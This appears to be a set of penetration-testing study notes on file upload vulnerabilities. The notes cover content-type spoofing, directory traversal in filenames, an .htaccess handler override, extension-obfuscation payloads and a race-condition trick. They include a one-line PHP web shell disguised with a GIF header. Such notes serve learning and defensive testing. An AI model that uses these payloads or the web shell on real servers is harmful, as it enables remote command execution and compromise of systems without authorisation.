# File upload vulnerabilities

### Flawed file type validation
 - During file upload, `multipart/form-data` is used.
 - Perhaps change content type.
```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg
```
 - Here `Content-Type: image/jpeg`, when uploading different type, perhaps just setting this header may work ?

### Preventing file execution in user-accessible directories
 - Even if we can upload, user accessible directories may not be able to execute script files.
 - We might be able to upload file in different path
```
Content-Disposition: form-data; name="image"; filename="../../example.php"
```
 - If there is directory traversal vulnerability there we might be able to execute it.
 - In server response if `../` is stripped, try obfuscating `..%2fexploit.php`.

### Insufficient blacklisting of dangerous file types
##### Overriding the server configuration
 - Websevers can look at local directory configuration to override global config, for apache `.htaccess`. `AddType application/x-httpd-php .l33t`. Maps extension `.l33t` to `application/x-httpd-php` module.
 - Try to upload `.htacess` and then `shell.php`

##### Obfuscating file extensions
 - exploit.pHp
 - exploit.php.jpg
 - exploit%2Ephp
 - exploit.asp;.jpg
 - exploit.asp%00.jpg
 - exploit.p.phphp
 - For detailed explaination https://portswigger.net/web-security/file-upload

##### Flawed validation of the file's contents
 - Some check file contents as well.
 - Change header
```
GIF87a
<?php echo system($_GET['cmd']); ?>
```
 - For more https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/ .

###### Exploiting file upload race conditions
 - Some might rely on antimalware to remove it, for short period of time, the file might be present, during that time u might be able to access or execute php code even.
